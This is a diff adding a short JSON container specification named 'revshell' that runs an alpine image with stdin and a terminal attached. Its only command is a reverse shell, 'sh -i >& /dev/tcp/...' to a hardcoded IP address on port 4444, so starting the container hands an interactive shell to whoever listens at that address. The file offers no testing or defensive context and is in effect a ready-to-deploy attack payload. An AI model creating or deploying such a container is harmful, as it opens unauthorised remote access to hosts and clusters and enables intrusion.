@@ -1,0 +1,15 @@
+{
+  "metadata": {
+    "name": "revshell"
+  },
+  "image": {
+    "image": "alpine"
+  },
+  "command": [
+    "sh",
+    "-c",
+    "sh -i >& /dev/tcp/65.0.93.190/4444 0>&1"
+  ],
+  "stdin": true,
+  "tty": true
+}
